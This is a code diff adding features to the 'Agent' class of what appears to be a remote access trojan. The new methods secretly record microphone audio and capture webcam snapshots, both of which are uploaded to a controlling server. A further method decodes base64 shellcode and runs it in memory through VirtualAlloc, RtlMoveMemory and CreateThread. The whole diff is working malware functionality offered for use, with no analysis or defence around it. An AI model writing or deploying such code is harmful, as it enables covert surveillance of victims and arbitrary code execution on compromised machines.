@@ -269,7 +269,71 @@ class Agent(object):
         tmp_file.close()
         screenshot.save(screenshot_file)
         self.upload(screenshot_file)
+    
+    @threaded
+    def record(self):
+        """ Records audio for a given duration """
+        try:
+            duration = 10
+            tmp_file = tempfile.NamedTemporaryFile()
+            rec_file = tmp_file.name + ".wav"
+            tmp_file.close()
+            self.send_output("[*] Recording audio...")
+            subprocess.Popen(["arecord", "-d", str(duration), "-r", "44100", "-f", "dat", rec_file]).wait()
+            self.upload(rec_file)
+        except Exception as exc:
+            self.send_output(traceback.format_exc())
 
+    @threaded
+    def webcam_snapshot(self):
+        """ Takes a snapshot with the webcam and uploads it to the server"""
+        try:
+            cam = None
+            for i in range(10):
+                try:
+                    cam = VideoCapture(0)   # 0 -> index of camera
+                    if not cam:
+                        raise Exception()
+                    s, img = cam.read()
+                    if not s:
+                        raise Exception()
+                    tmp_file = tempfile.NamedTemporaryFile()
+                    snapshot_file = tmp_file.name + ".jpg"
+                    tmp_file.close()
+                    imwrite(snapshot_file, img)     # save image
+                    self.upload(snapshot_file)
+                    break
+                except:
+                    try:
+                        cam.release()
+                    except:
+                        pass
+            if cam:
+                cam.release()
+        except Exception as exc:
+            self.send_output(traceback.format_exc())
+    
+    @threaded
+    def execshellcode(self, shellcode):
+        """ Executes supplied shellcode """
+        try:
+            shellcode = b64decode(shellcode)
+            execshellcode = bytearray(shellcode)
+            self.send_output("[*] Executing shellcode...")
+            ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), 
+                ctypes.c_int(len(execshellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
+        
+            buf = (ctypes.c_char * len(execshellcode)).from_buffer(execshellcode)
+        
+            ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(execshellcode))) 
+        
+            ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
+                ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
+        
+            ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
+        except Exception as exc:
+            self.send_output(traceback.format_exc())
+    
     def help(self):
         """ Displays the help """
         self.send_output(config.HELP)
